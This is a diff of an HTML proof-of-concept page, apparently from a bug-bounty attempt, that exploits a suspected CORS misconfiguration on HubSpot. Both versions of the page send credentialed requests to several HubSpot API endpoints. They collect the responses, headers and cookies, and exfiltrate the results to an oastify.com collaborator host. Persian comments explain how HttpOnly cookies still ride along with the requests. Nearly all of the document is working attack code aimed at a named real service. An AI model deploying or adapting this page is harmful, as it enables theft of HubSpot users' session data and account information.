@@ -1,155 +1,120 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS Exploit - HubSpot Cookie Stealer</title>
+    <title>CORS Exploit - Get HubSpot User Info</title>
 </head>
 <body>
-    <h1>🔓 Extracting HubSpot Cookies...</h1>
+    <h1>🔓 Extracting HubSpot Data with Cookies...</h1>
     <div id="status">Initializing...</div>
     <div id="result" style="white-space: pre-wrap; background: #1e1e1e; color: #00ff00; padding: 15px; margin: 10px; border-radius: 5px; font-family: monospace; max-height: 500px; overflow: auto;"></div>
 
     <script>
     (function() {
-        const COLLABORATOR = 'https://ptm8vbxknyg22gxtpab76f8h187zvpje.oastify.com';
-        const TARGET = 'https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth';
+        const COLLABORATOR = 'https://d8mwazc82mvqh4ch4yqvl3n5gwmnaey3.oastify.com';
+        
+        // Various endpoints that might return user data
+        const endpoints = [
+            'https://api.hubspot.com/home/v2/api/portal',
+            'https://api.hubspot.com/home/v2/api/no-intended-portal',
+            'https://app.hubspot.com/api/contacts/v1/contacts',
+            'https://app.hubspot.com/api/account-info/v1/account-info',
+            'https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth'
+        ];
         
         async function exploit() {
             try {
-                document.getElementById('status').innerHTML = '⏳ Sending CORS request with credentials...';
-                document.getElementById('status').style.color = 'orange';
+                document.getElementById('status').innerHTML = '⏳ Sending requests with credentials...';
                 
-                // ===== STEP 1: Send request with credentials =====
-                const response = await fetch(TARGET, {
-                    method: 'POST',
-                    credentials: 'include',  // CRITICAL: Sends cookies!
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify([{
-                        event: 'page_view',
-                        properties: {
-                            url: window.location.href,
-                            timestamp: new Date().toISOString(),
-                            app: 'hubspot',
-                            screen: 'test',
-                            accountId: 'test'
-                        }
-                    }])
-                });
-
-                // ===== STEP 2: Read response =====
-                const responseText = await response.text();
+                let allResults = [];
                 
-                // ===== STEP 3: Extract cookies from Set-Cookie header =====
-                const setCookieHeader = response.headers.get('Set-Cookie') || '';
-                const extractedCookies = parseSetCookie(setCookieHeader);
+                // Try all endpoints
+                for (let url of endpoints) {
+                    try {
+                        const response = await fetch(url, {
+                            method: url.includes('usage-logging') ? 'POST' : 'GET',
+                            credentials: 'include',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'Accept': 'application/json'
+                            },
+                            ...(url.includes('usage-logging') && {
+                                body: JSON.stringify([{
+                                    event: 'page_view',
+                                    properties: {
+                                        url: 'https://example.com',
+                                        timestamp: new Date().toISOString(),
+                                        app: 'hubspot',
+                                        screen: 'test',
+                                        accountId: 'test'
+                                    }
+                                }])
+                            })
+                        });
+                        
+                        const data = await response.text();
+                        const headers = {};
+                        response.headers.forEach((v, k) => { headers[k] = v; });
+                        
+                        allResults.push({
+                            url: url,
+                            status: response.status,
+                            headers: headers,
+                            data: data.substring(0, 1000),
+                            setCookie: headers['set-cookie'] || 'No Set-Cookie'
+                        });
+                        
+                    } catch(e) {
+                        allResults.push({
+                            url: url,
+                            error: e.message
+                        });
+                    }
+                }
                 
-                // ===== STEP 4: Get document cookies (non-HttpOnly) =====
-                const docCookies = document.cookie || 'No document.cookie (all HttpOnly)';
+                // ===== Try to get cookies from document =====
+                const docCookies = document.cookie || 'No cookies (all HttpOnly)';
                 
-                // ===== STEP 5: Prepare payload =====
+                // ===== Prepare final payload =====
                 const payload = {
-                    success: true,
-                    cors_headers: {
-                        'access-control-allow-origin': response.headers.get('access-control-allow-origin'),
-                        'access-control-allow-credentials': response.headers.get('access-control-allow-credentials'),
-                        'access-control-allow-methods': response.headers.get('access-control-allow-methods')
-                    },
-                    cookies_from_set_cookie: extractedCookies,
+                    all_endpoints: allResults,
                     document_cookies: docCookies,
-                    response_status: response.status,
-                    response_body: responseText.substring(0, 500),
-                    all_response_headers: getHeadersObject(response.headers),
                     timestamp: new Date().toISOString(),
                     origin: window.location.origin,
-                    userAgent: navigator.userAgent
+                    userAgent: navigator.userAgent,
+                    note: 'HttpOnly cookies are sent automatically but cannot be read by JavaScript'
                 };
-
-                // ===== STEP 6: Display result =====
+                
+                // ===== Display =====
                 document.getElementById('result').textContent = JSON.stringify(payload, null, 2);
-                document.getElementById('status').innerHTML = '✅ Cookies extracted! Check Collaborator.';
-                document.getElementById('status').style.color = 'green';
-
-                // ===== STEP 7: Send to Collaborator =====
-                // IMPORTANT: Use mode: 'no-cors' for collaborator
+                document.getElementById('status').innerHTML = '✅ Data extracted! Check Collaborator.';
+                
+                // ===== Send to Collaborator =====
                 await fetch(COLLABORATOR, {
                     method: 'POST',
                     mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify(payload)
                 });
-
-                console.log('[+] All data sent to collaborator!');
-                console.log('[+] Cookies:', extractedCookies);
-
-            } catch (error) {
-                document.getElementById('status').innerHTML = '❌ Error occurred';
-                document.getElementById('status').style.color = 'red';
-                document.getElementById('result').textContent = 'Error: ' + error.message + '\nStack: ' + error.stack;
                 
-                // Send error to collaborator
+                console.log('[+] All data sent!');
+                
+            } catch (error) {
+                document.getElementById('status').innerHTML = '❌ Error';
+                document.getElementById('result').textContent = 'Error: ' + error.message;
+                
                 await fetch(COLLABORATOR, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({
                         error: error.message,
-                        stack: error.stack,
-                        timestamp: new Date().toISOString()
+                        stack: error.stack
                     })
                 });
             }
         }
-
-        function parseSetCookie(setCookieHeader) {
-            if (!setCookieHeader) return [];
-            
-            const cookies = [];
-            // Split by comma but be careful with commas in values
-            const parts = setCookieHeader.split(/,(?=\s*[^=]+=[^=]+)/);
-            
-            parts.forEach(part => {
-                const match = part.match(/([^=;]+)=([^;]+)/);
-                if (match) {
-                    cookies.push({
-                        name: match[1].trim(),
-                        value: match[2].trim(),
-                        full: part.trim()
-                    });
-                }
-            });
-            
-            return cookies;
-        }
-
-        function getHeadersObject(headers) {
-            const obj = {};
-            headers.forEach((value, key) => {
-                obj[key] = value;
-            });
-            return obj;
-        }
-
+        
         // ===== Execute =====
         exploit();
-
-        // ===== Also try to get cookies via other endpoints =====
-        setTimeout(() => {
-            console.log('[*] Trying additional endpoints...');
-            
-            // Try to get portal info
-            fetch('https://api.hubspot.com/home/v2/api/portal', {
-                method: 'GET',
-                credentials: 'include'
-            })
-            .then(r => r.text())
-            .then(data => {
-                console.log('[+] Portal response:', data);
-            })
-            .catch(e => console.log('[-] Portal failed:', e));
-            
-        }, 2000);
     })();
     </script>
 
@@ -161,12 +126,11 @@
         <li>Cookies are sent with <code>credentials: 'include'</code> ✅</li>
     </ul>
     
-    <h3>📋 Instructions:</h3>
-    <ol>
-        <li>✅ این صفحه رو باز کن</li>
-        <li>✅ کوکی‌ها از Set-Cookie هدر استخراج میشن</li>
-        <li>✅ نتیجه در Collaborator قابل مشاهده هست</li>
-        <li>✅ اگر کوکی‌ها HttpOnly باشن، فقط در Set-Cookie هدر دیده میشن</li>
-    </ol>
+    <h3>🔑 نکته مهم:</h3>
+    <p>
+        <strong>HttpOnly Cookies</strong> رو نمیشه با JavaScript خوند، اما <strong>خودکار به همراه درخواست ارسال میشن</strong>.
+        <br><br>
+        اگر سرور پاسخ بده و اطلاعات کاربر رو برگردونه، <strong>اون اطلاعات رو میتونی ببینی</strong>!
+    </p>
 </body>
 </html>
